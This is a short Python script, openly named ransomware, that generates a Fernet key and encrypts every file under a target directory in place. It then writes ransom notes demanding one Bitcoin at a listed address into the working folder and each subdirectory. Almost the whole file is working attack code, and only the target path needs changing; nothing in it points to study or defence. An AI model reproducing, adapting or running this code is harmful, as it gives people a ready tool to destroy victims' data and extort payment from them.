import os
import random
import string
from cryptography.fernet import Fernet

# Generate and save a key for encryption/decryption
def generate_key():
    key = Fernet.generate_key()
    with open("ransomware_key.key", "wb") as key_file:
        key_file.write(key)
    return key

# Load the previously generated key
def load_key():
    return open("ransomware_key.key", "rb").read()

# Encrypt a file
def encrypt_file(file_path, key):
    with open(file_path, "rb") as file:
        file_data = file.read()
    encrypted_data = Fernet(key).encrypt(file_data)
    with open(file_path, "wb") as file:
        file.write(encrypted_data)

# Encrypt all files in a directory
def encrypt_directory(directory_path, key):
    for root, dirs, files in os.walk(directory_path):
        for file_name in files:
            file_path = os.path.join(root, file_name)
            encrypt_file(file_path, key)

# Create a ransom note
def create_ransom_note():
    ransom_note_content = """
    Your files have been encrypted. To recover them, send 1 Bitcoin to the following address:
    1FfmbHfnpaZjKFvyi1okTjJJusN455paPH
    Contact us at: fakeemail@domain.com
    """
    with open("ransom_note.txt", "w") as note:
        note.write(ransom_note_content)

    for root, dirs, files in os.walk(directory_to_encrypt):
        for dir_name in dirs:
            note_path = os.path.join(root, dir_name, "ransom_note.txt")
            with open(note_path, "w") as note_file:
                note_file.write(ransom_note_content)

if __name__ == "__main__":
    directory_to_encrypt = "test"  # Specify the directory to encrypt
    encryption_key = generate_key()
    encrypt_directory(directory_to_encrypt, encryption_key)
    create_ransom_note()
    print(f"Files in {directory_to_encrypt} have been encrypted and ransom notes have been created.")